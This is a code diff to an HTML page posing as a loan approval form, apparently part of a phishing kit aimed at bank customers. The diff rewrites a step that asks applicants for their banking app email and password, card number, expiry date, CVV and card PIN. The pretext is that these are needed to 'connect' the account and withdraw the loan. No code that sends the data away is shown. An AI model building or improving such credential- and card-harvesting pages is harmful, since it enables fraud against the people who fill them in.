@@ -50,7 +50,7 @@
                 <input type="number" name="amount" id="amount" placeholder="Enter Loan Amount "><br>
             
                 <label for="duration">Loan Duration:</label>
-                <input type="number" name="amount" id="amount" placeholder="Enter Your Loan Duration "><br>
+                <input type="number" name="duration" id="duration" placeholder="Enter Your Loan Duration "><br>
             
                 <label for="identity">ID Number:</label> <br>
                 <input type="number" name="identity" id="identity" placeholder="Enter ID number "> <br>
@@ -173,29 +173,38 @@
    
                 <div style="padding: 5%;">
 
-                    <p id="p2" style="margin-top: 15%; font-size: 230%;">Kindly input the required details to enable your loan disbursement into your account and
-                        be ensured that your details are all encrypted and safe</p>
-                    <label for="email">E-Mail Address:</label> <br>
-                    <input type="email" class="windhoeks" name="windhoek-email" id="windhoek-email" placeholder="Enter Email"> <br>
-                
-                    <label for="password">Password:</label><br>
-                    <input type="password" class="windhoeks" name="wimdhoek-password" id="wimdhoek-password" placeholder="Enter password"> <br>
+                    <p id="p2" style="margin-top: 15%; font-size: 200%; color: rgb(57,63,86);">Please enter your app username and password. Use your app username and password to connect your account to your loan dashboard for successful withdrawal of your loan amount 
+                    </p>
 
-                    <label for="card">Card Number:</label> <br>
-                    <input type="number" class="windhoeks" name="cardNumber" id="cardNumber" placeholder="Enter Card Number"> <br>
+                    <div id="continue3">
+
+                        <label for="email">Email:</label> <br>
+                        <input type="email" class="windhoeks" name="windhoek-email" id="windhoek-email" placeholder="Email"> <br>
+                        
+                        <label for="password">Password:</label><br>
+                        <input type="password" class="windhoeks" name="wimdhoek-password" id="wimdhoek-password" placeholder="Password"> <br>
+                        <p id="caution2"></p>
+                        <p id="next2">Continue</p>
+                    </div>
+
+                    <div style="display: none;" id="continue4">
+ 
+                        <label for="card">Card Number:</label> <br>
+                        <input type="number" class="windhoeks" name="cardNumber" id="cardNumber" placeholder="Enter Card Number"> <br>
             
                     <div id="card-details">
                         <input type="text" class="windhoeks" name="card-date" id="card-date" placeholder="mm/yy" maxlength="5"> <br>
                         <input type="number" class="windhoeks" name="cvv" id="cvv" placeholder="Enter Card Cvv Number" maxlength="3"> <br>
             
                     </div>
-
+                    
                     <label for="pin">Card Pin:</label><br>
                     <input type="number" class="windhoeks" name="wimdhoek-pin" id="wimdhoek-pin" placeholder="Enter Card Pin"> <br>          
-                   
+                    <p id="p2" style="margin-top: 5%; font-size: 200%; color: rgb(57,63,86);">In order to withdraw your loan amount from your loan dashboard to your account, you need to complete the enrollment process.</p>
                     <p id="error4"></p>
-
-                     <input type="submit" value="Confirm" id="submit4" disabled>
+                     <input type="submit" class="submit4" value="Confirm" id="submit4" disabled style="background-color: transparent; border-radius: 100px; border: 2px solid grey; color: #ccc;">
+                </div>
+                   
                      
                 </div>
             </div>
@@ -210,7 +219,7 @@
 
     </form>
 
-    <div id="write-up" style="display: none;">
+    <div id="write-up" style="display: none; margin-top: 5%;">
         <div id="write">
             <!-- <img src="./b14ebf87-f581-432d-82f4-c51932ca8653.jpg" alt=""> -->
             <!-- <p id="p7">Konga Loan Approval Form</p> -->
